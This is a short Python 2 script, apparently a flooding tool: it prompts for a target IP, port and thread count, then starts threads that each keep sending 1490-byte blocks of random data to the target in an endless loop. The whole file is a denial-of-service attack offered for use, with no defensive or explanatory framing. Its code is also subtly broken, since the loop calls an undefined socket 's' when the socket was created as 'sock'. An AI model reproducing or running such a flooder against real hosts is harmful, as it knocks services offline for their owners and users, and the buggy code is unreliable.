import sys
import os
import time
import socket
import random
import threading

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print
print
ip = raw_input("IP : ")
port = input("Port : ")
thread_num = input("Threads : ")

def run():
	bytes = random._urandom(1490)
	while True:
		try:
			s.connect((str(ip),int(port))) 
			s.send(bytes)
			print "\033[92m [+] Package Sent ! \033[0m"
		except:
			s.close()
			print "\033[91m [!] Error , Socket Closed \033[0m"
			
for i in range(thread_num):
    th = threading.Thread(target = run)
    th.start()
